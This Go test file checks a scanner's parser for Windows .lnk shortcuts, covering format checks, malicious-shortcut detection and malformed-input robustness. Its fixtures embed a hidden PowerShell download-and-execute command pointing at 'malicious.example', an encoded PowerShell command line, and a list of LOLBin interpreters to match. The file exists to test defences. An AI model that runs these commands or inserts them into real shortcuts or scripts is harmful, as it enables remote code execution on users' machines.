package main

import (
	"bytes"
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"
)

// lnk.go parses attacker-controlled binary structures with size prefixes that
// drive slice indexing, which is exactly the shape of code that panics on
// malformed input. The malformed cases below are as important as the positive
// ones: after A1, a parser panic is contained to a single file, but containing a
// crash is a worse outcome than not crashing.

// lnkBuilder assembles a synthetic .lnk. Fixtures are built rather than
// committed so the byte layout is visible and adjustable at the point of use.
type lnkBuilder struct {
	flags   uint32
	unicode bool
	strings []string // StringData blocks, in MS-SHLLINK order
}

// build emits header + StringData blocks.
func (b lnkBuilder) build() []byte {
	var out bytes.Buffer

	header := make([]byte, 0x4C)
	binary.LittleEndian.PutUint32(header[0:4], 0x4C) // HeaderSize
	copy(header[4:20], lnkCLSID)
	flags := b.flags
	if b.unicode {
		flags |= lnkIsUnicode
	}
	binary.LittleEndian.PutUint32(header[20:24], flags)
	out.Write(header)

	for _, s := range b.strings {
		out.Write(encodeLNKString(s, b.unicode))
	}
	return out.Bytes()
}

// encodeLNKString emits a StringData block: a 2-byte character count followed
// by the characters (UTF-16LE or ANSI).
func encodeLNKString(s string, unicode bool) []byte {
	var out bytes.Buffer
	if unicode {
		u16 := utf16.Encode([]rune(s))
		_ = binary.Write(&out, binary.LittleEndian, uint16(len(u16)))
		for _, u := range u16 {
			_ = binary.Write(&out, binary.LittleEndian, u)
		}
		return out.Bytes()
	}
	_ = binary.Write(&out, binary.LittleEndian, uint16(len(s)))
	out.WriteString(s)
	return out.Bytes()
}

func lnkTestConfig() Config {
	return Config{Mode: "standard", MinStringLen: 5, MaxDecodeDepth: 2}
}

// TestLooksLNK covers format identification, including the truncation and
// wrong-magic cases that must be rejected before any parsing happens.
func TestLooksLNK(t *testing.T) {
	valid := lnkBuilder{}.build()

	tests := []struct {
		name string
		data []byte
		want bool
	}{
		{"valid header", valid, true},
		{"nil", nil, false},
		{"empty", []byte{}, false},
		{"one byte short of the header", valid[:0x4B], false},
		{"wrong header size", func() []byte {
			d := append([]byte(nil), valid...)
			binary.LittleEndian.PutUint32(d[0:4], 0x50)
			return d
		}(), false},
		{"wrong CLSID", func() []byte {
			d := append([]byte(nil), valid...)
			d[4] ^= 0xFF
			return d
		}(), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := looksLNK(tt.data); got != tt.want {
				t.Fatalf("looksLNK() = %v, want %v", got, tt.want)
			}
		})
	}
}

// TestAnalyzeLNKDetectsLOLBinTarget is the positive case this parser exists
// for: a shortcut pointing at a script interpreter.
func TestAnalyzeLNKDetectsLOLBinTarget(t *testing.T) {
	data := lnkBuilder{
		flags:   lnkHasName | lnkHasRelativePath | lnkHasArguments,
		unicode: true,
		strings: []string{
			"Invoice",
			`..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example/a.ps1')",
		},
	}.build()

	result := &ScanResult{}
	t.Cleanup(func() { releaseFindingIndex(result) })
	if err := analyzeLNK(result, lnkTestConfig(), data); err != nil {
		t.Fatalf("analyzeLNK() error = %v", err)
	}

	var got *Finding
	for i := range result.Findings {
		if strings.Contains(result.Findings[i].Title, "command interpreter") {
			got = &result.Findings[i]
			break
		}
	}
	if got == nil {
		t.Fatalf("no interpreter finding; got %+v", result.Findings)
	}
	if got.Severity != "High" {
		t.Fatalf("severity = %q, want High", got.Severity)
	}
	if !strings.Contains(got.Evidence, "powershell.exe") {
		t.Fatalf("evidence %q should name the resolved LOLBin", got.Evidence)
	}
}

// TestAnalyzeLNKScansEmbeddedCommandLine confirms the arguments block is handed
// to the script engine — the command line is the actual payload of a malicious
// shortcut, and the reason this parser was added.
func TestAnalyzeLNKScansEmbeddedCommandLine(t *testing.T) {
	data := lnkBuilder{
		flags:   lnkHasRelativePath | lnkHasArguments,
		unicode: true,
		strings: []string{
			`C:\Windows\System32\cmd.exe`,
			`/c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`,
		},
	}.build()

	result := &ScanResult{}
	t.Cleanup(func() { releaseFindingIndex(result) })
	if err := analyzeLNK(result, lnkTestConfig(), data); err != nil {
		t.Fatalf("analyzeLNK() error = %v", err)
	}

	if len(result.Findings) == 0 {
		t.Fatal("no findings from a shortcut carrying an encoded PowerShell command line")
	}
}

// TestAnalyzeLNKFlagsOversizedShortcut covers the appended-payload heuristic.
func TestAnalyzeLNKFlagsOversizedShortcut(t *testing.T) {
	base := lnkBuilder{
		flags:   lnkHasRelativePath,
		unicode: true,
		strings: []string{`C:\Windows\notepad.exe`},
	}.build()
	// Append filler past the 8 KB threshold, as an embedded payload would.
	data := append(base, bytes.Repeat([]byte{0x41}, 9*1024)...)

	result := &ScanResult{}
	t.Cleanup(func() { releaseFindingIndex(result) })
	if err := analyzeLNK(result, lnkTestConfig(), data); err != nil {
		t.Fatalf("analyzeLNK() error = %v", err)
	}

	var found bool
	for _, f := range result.Findings {
		if strings.Contains(f.Title, "large shortcut") {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("oversized shortcut not flagged; findings: %+v", result.Findings)
	}
}

// TestAnalyzeLNKBenignShortcut is the negative case: an ordinary shortcut to a
// normal application must not produce execution findings.
func TestAnalyzeLNKBenignShortcut(t *testing.T) {
	data := lnkBuilder{
		flags:   lnkHasName | lnkHasRelativePath | lnkHasWorkingDir,
		unicode: true,
		strings: []string{
			"Readme",
			`..\..\Documents\readme.txt`,
			`C:\Users\Public\Documents`,
		},
	}.build()

	result := &ScanResult{}
	t.Cleanup(func() { releaseFindingIndex(result) })
	if err := analyzeLNK(result, lnkTestConfig(), data); err != nil {
		t.Fatalf("analyzeLNK() error = %v", err)
	}

	for _, f := range result.Findings {
		if f.Severity == "High" || f.Severity == "Critical" {
			t.Fatalf("benign shortcut produced %s finding %q", f.Severity, f.Title)
		}
	}
}

// TestAnalyzeLNKMalformedInputDoesNotPanic is the robustness gate. Every case
// is a plausible malformed/hostile shortcut: truncated blocks, size prefixes
// that overrun the buffer, and flags promising data that is not present.
func TestAnalyzeLNKMalformedInputDoesNotPanic(t *testing.T) {
	valid := lnkBuilder{
		flags:   lnkHasName | lnkHasRelativePath | lnkHasArguments,
		unicode: true,
		strings: []string{"a", `powershell.exe`, "-nop -c whoami"},
	}.build()

	cases := map[string][]byte{
		"nil": nil,
		"header only, flags promise strings": lnkBuilder{
			flags:   lnkHasName | lnkHasRelativePath | lnkHasArguments,
			unicode: true,
		}.build(),
		"truncated mid-string-block": valid[:len(valid)-3],
		"string count overruns buffer": func() []byte {
			d := lnkBuilder{flags: lnkHasName, unicode: true}.build()
			// CountCharacters = 0xFFFF with no payload behind it.
			return append(d, 0xFF, 0xFF)
		}(),
		"ansi string count overruns buffer": func() []byte {
			d := lnkBuilder{flags: lnkHasName}.build()
			return append(d, 0xFF, 0x7F)
		}(),
		"idlist size overruns buffer": func() []byte {
			d := lnkBuilder{flags: lnkHasLinkTargetIDList | lnkHasName, unicode: true}.build()
			return append(d, 0xFF, 0xFF) // huge IDList size, no payload
		}(),
		"linkinfo size overruns buffer": func() []byte {
			d := lnkBuilder{flags: lnkHasLinkInfo | lnkHasName, unicode: true}.build()
			return append(d, 0xFF, 0xFF, 0xFF, 0x7F)
		}(),
		"idlist size truncated": func() []byte {
			d := lnkBuilder{flags: lnkHasLinkTargetIDList, unicode: true}.build()
			return append(d, 0x01) // 1 of the 2 size bytes
		}(),
		"all flags set, no data": func() []byte {
			return lnkBuilder{
				flags: lnkHasLinkTargetIDList | lnkHasLinkInfo | lnkHasName |
					lnkHasRelativePath | lnkHasWorkingDir | lnkHasArguments |
					lnkHasIconLocation,
				unicode: true,
			}.build()
		}(),
	}

	for name, data := range cases {
		t.Run(name, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("analyzeLNK panicked on %s: %v", name, r)
				}
			}()
			result := &ScanResult{}
			t.Cleanup(func() { releaseFindingIndex(result) })
			if err := analyzeLNK(result, lnkTestConfig(), data); err != nil {
				t.Fatalf("analyzeLNK() error = %v", err)
			}
		})
	}
}

// TestReadLNKStringDataBounds pins the bounds contract of the block reader
// directly, including the overflow case where count*2 exceeds the buffer.
func TestReadLNKStringDataBounds(t *testing.T) {
	tests := []struct {
		name    string
		data    []byte
		pos     int
		unicode bool
		wantOK  bool
		wantStr string
	}{
		{
			name:    "ansi string reads cleanly",
			data:    append([]byte{0x03, 0x00}, []byte("abc")...),
			wantOK:  true,
			wantStr: "abc",
		},
		{
			name:    "unicode string reads cleanly",
			data:    encodeLNKString("hi", true),
			unicode: true,
			wantOK:  true,
			wantStr: "hi",
		},
		{"negative position", []byte{0x01, 0x00, 'a'}, -1, false, false, ""},
		{"position past end", []byte{0x01, 0x00, 'a'}, 99, false, false, ""},
		{"count prefix truncated", []byte{0x01}, 0, false, false, ""},
		{"ansi count overruns", []byte{0x10, 0x00, 'a'}, 0, false, false, ""},
		{"unicode count overruns", []byte{0x10, 0x00, 'a', 0x00}, 0, true, false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _, ok := readLNKStringData(tt.data, tt.pos, tt.unicode)
			if ok != tt.wantOK {
				t.Fatalf("ok = %v, want %v", ok, tt.wantOK)
			}
			if got != tt.wantStr {
				t.Fatalf("string = %q, want %q", got, tt.wantStr)
			}
		})
	}
}

// TestFirstLOLBin covers interpreter matching, including the negative case.
func TestFirstLOLBin(t *testing.T) {
	tests := []struct {
		haystack string
		want     string
	}{
		{`c:\windows\system32\powershell.exe`, "powershell.exe"},
		{`c:\windows\system32\mshta.exe`, "mshta.exe"},
		{`c:\windows\system32\rundll32.exe`, "rundll32.exe"},
		{`c:\program files\app\readme.txt`, ""},
		{"", ""},
	}
	for _, tt := range tests {
		t.Run(tt.haystack, func(t *testing.T) {
			if got := firstLOLBin(tt.haystack); got != tt.want {
				t.Fatalf("firstLOLBin(%q) = %q, want %q", tt.haystack, got, tt.want)
			}
		})
	}
}
